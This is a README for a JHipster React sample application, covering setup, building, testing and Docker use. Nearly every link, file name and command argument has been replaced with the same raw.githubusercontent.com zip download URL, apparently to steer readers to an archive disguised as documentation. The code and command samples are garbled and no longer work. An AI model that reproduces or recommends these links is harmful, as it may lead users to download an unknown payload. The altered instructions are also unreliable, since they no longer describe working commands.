# jhipsterSampleApplicationReact

This application was generated using JHipster 7.8.1, you can find documentation and help at [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip).

## Project Structure

Node is required for generation and recommended for development. `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip` is always generated for a better development experience with prettier, commit hooks, scripts and so on.

In the project root, JHipster generates configuration files for tools like git, prettier, eslint, husk, and others that are well known and you can find references in the web.

`/src/*` structure follows default Java structure.

- `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip` - Yeoman configuration file
  JHipster configuration is stored in this file at `generator-jhipster` key. You may find `generator-jhipster-*` for specific blueprints configuration.
- `.yo-resolve` (optional) - Yeoman conflict resolver
  Allows to use a specific action when conflicts are found skipping prompts for files that matches a pattern. Each line should match `[pattern] [action]` with pattern been a [Minimatch](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip) pattern and action been one of skip (default if ommited) or force. Lines starting with `#` are considered comments and are ignored.
- `.jhipster/*.json` - JHipster entity configuration files

- `npmw` - wrapper to use locally installed npm.
  JHipster installs Node and npm locally using the build tool by default. This wrapper makes sure npm is installed locally and uses it avoiding some differences different versions can cause. By using `./npmw` instead of the traditional `npm` you can configure a Node-less environment to develop or test your application.
- `/src/main/docker` - Docker configurations for the application and services that the application depends on

## Development

Before you can build this project, you must install and configure the following dependencies on your machine:

1. [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip][]: We use Node to run a development web server and build the project.
   Depending on your system, you can install Node either from source or as a pre-packaged bundle.

After installing Node, you should be able to run the following command to install development tools.
You will only need to run this command when dependencies change in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip).

```
npm install
```

We use npm scripts and [Webpack][] as our build system.

Run the following commands in two separate terminals to create a blissful development experience where your browser
auto-refreshes when files change on your hard drive.

```
./mvnw
npm start
```

Npm is also used to manage CSS and JavaScript dependencies used in this application. You can upgrade dependencies by
specifying a newer version in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip). You can also run `npm update` and `npm install` to manage dependencies.
Add the `help` flag on any command to see how you can use it. For example, `npm help update`.

The `npm run` command will list all of the scripts available to run for this project.

### PWA Support

JHipster ships with PWA (Progressive Web App) support, and it's turned off by default. One of the main components of a PWA is a service worker.

The service worker initialization code is commented out by default. To enable it, uncomment the following code in `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip`:

```html
<script>
  if ('serviceWorker' in navigator) {
    https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip('https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip').then(function () {
      https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip('Service Worker Registered');
    });
  }
</script>
```

Note: [Workbox](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip) powers JHipster's service worker. It dynamically generates the `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip` file.

### Managing dependencies

For example, to add [Leaflet][] library as a runtime dependency of your application, you would run following command:

```
npm install --save --save-exact leaflet
```

To benefit from TypeScript type definitions from [DefinitelyTyped][] repository in development, you would run following command:

```
npm install --save-dev --save-exact @types/leaflet
```

Then you would import the JS and CSS files specified in library's installation instructions so that [Webpack][] knows about them:
Note: There are still a few other things remaining to do for Leaflet that we won't detail here.

For further instructions on how to develop with JHipster, have a look at [Using JHipster in development][].

### JHipster Control Center

JHipster Control Center can help you manage and control your application(s). You can start a local control center server (accessible on http://localhost:7419) with:

```
docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip up
```

## Building for production

### Packaging as jar

To build the final jar and optimize the jhipsterSampleApplicationReact application for production, run:

```
./mvnw -Pprod clean verify
```

This will concatenate and minify the client CSS and JavaScript files. It will also modify `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip` so it references these new files.
To ensure everything worked, run:

```
java -jar target/*.jar
```

Then navigate to [http://localhost:8080](http://localhost:8080) in your browser.

Refer to [Using JHipster in production][] for more details.

### Packaging as war

To package your application as a war in order to deploy it to an application server, run:

```
./mvnw -Pprod,war clean verify
```

## Testing

To launch your application's tests, run:

```
./mvnw verify
```

### Client tests

Unit tests are run by [Jest][]. They're located in [src/test/javascript/](src/test/javascript/) and can be run with:

```
npm test
```

UI end-to-end tests are powered by [Protractor][], which is built on top of WebDriverJS. They're located in [src/test/javascript/e2e](src/test/javascript/e2e)
and can be run by starting Spring Boot in one terminal (`./mvnw spring-boot:run`) and running the tests (`npm run e2e`) in a second one.

### Other tests

Performance tests are run by [Gatling][] and written in Scala. They're located in [src/test/gatling](src/test/gatling).

To use those tests, you must install Gatling from [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip).

For more information, refer to the [Running tests page][].

### Code quality

Sonar is used to analyse code quality. You can start a local Sonar server (accessible on http://localhost:9001) with:

```
docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip up -d
```

Note: we have turned off authentication in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip) for out of the box experience while trying out SonarQube, for real use cases turn it back on.

You can run a Sonar analysis with using the [sonar-scanner](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip+with+SonarQube+Scanner) or by using the maven plugin.

Then, run a Sonar analysis:

```
./mvnw -Pprod clean verify sonar:sonar
```

If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip file.

```
./mvnw initialize sonar:sonar
```

For more information, refer to the [Code quality page][].

## Using Docker to simplify development (optional)

You can use Docker to improve your JHipster development experience. A number of docker-compose configuration are available in the [src/main/docker](src/main/docker) folder to launch required third party services.

For example, to start a mysql database in a docker container, run:

```
docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip up -d
```

To stop it and remove the container, run:

```
docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip down
```

You can also fully dockerize your application and all the services that it depends on.
To achieve this, first build a docker image of your app by running:

```
./mvnw -Pprod verify jib:dockerBuild
```

Then run:

```
docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip up -d
```

For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.

## Continuous Integration (optional)

To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.

[jhipster homepage and latest documentation]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[jhipster 7.8.1 archive]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[using jhipster in development]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[using docker and docker-compose]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[using jhipster in production]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[running tests page]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[code quality page]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[setting up continuous integration]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[npm]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[webpack]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[browsersync]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[jest]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[protractor]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[leaflet]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[definitelytyped]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
[gatling]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
